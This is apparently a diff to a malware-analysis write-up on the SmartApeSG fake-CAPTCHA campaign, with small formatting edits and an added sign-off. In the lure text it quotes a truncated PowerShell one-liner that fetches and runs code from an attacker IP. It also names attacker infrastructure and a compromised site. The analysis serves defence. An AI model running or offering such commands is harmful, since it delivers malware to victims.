@@ -148,7 +148,8 @@ Domains and IPs can rotate, but the formula stays the same.
                   │
                   ▼
    Stage 3:  Fake CAPTCHA page — React 19 + Tailwind, 1.7 MB
-             "Press Win+R, paste: powershell -c iex(irm 178.156.199.54 ...)"
+             "Win+R, paste: 
+             powershell -c iex(irm 178.156.199.54 ...)"
 </pre>
 
 <!--
@@ -1073,6 +1074,8 @@ WHERE id_resp_h = '198.12.223.167'::inet;
 ```bash
 head -20 pcaps/2026-05-22-files-from-SmartApeSG-activity/2026-05-22-step-01-legitimate-but-compromised-site.txt
 ```
+
+... returns ...
 
 ```
 GET https://nhanhoa.org/ HTTP/1.1
@@ -2427,6 +2430,10 @@ SmartApeSG's playbook: find a WordPress site, inject a script tag, show a fake C
 Trust, but verify. Don't trust port 443. Don't trust CAPTCHAs that ask you to run code.
 
 **And for the love of God, patch your WordPress plugins.**
+
+<br>
+
+If this was useful — subscribe, like, and share! See you next time.
 
 <!--
 - Based on everything in Brad Duncan's analysis and the PCAP, SmartApeSG's playbook isn't sophisticated: find WordPress, inject script, show fake CAPTCHA, wait.
